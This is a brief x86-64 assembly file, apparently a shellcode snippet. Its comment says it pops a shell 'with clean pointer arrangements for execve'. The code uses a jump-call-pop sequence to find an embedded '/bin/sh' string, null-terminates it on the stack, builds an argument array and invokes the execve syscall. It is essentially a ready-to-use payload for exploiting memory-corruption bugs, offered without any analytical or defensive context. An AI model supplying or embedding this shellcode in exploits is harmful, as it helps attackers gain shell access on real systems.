;---------------------------------
;bplinux@posteo.de
;
;this is used to pop a shell
;(or whatever) with clean pointer
;arrangements for execve
;---------------------------------

[BITS 64]

EXECVE	equ 59

segment .text
	global _start

_start:	jmp _call
_back:	pop rdi
	mov al, 0x40
	sub rsp, rax
	xor rax, rax
	mov [rdi+7], al ;for execution on stack
	push rax
	push rdi
	lea rsi, [rsp]
	mov al, EXECVE
	xor rdx, rdx
	syscall
_call:	call _back
	db "/bin/sh",0
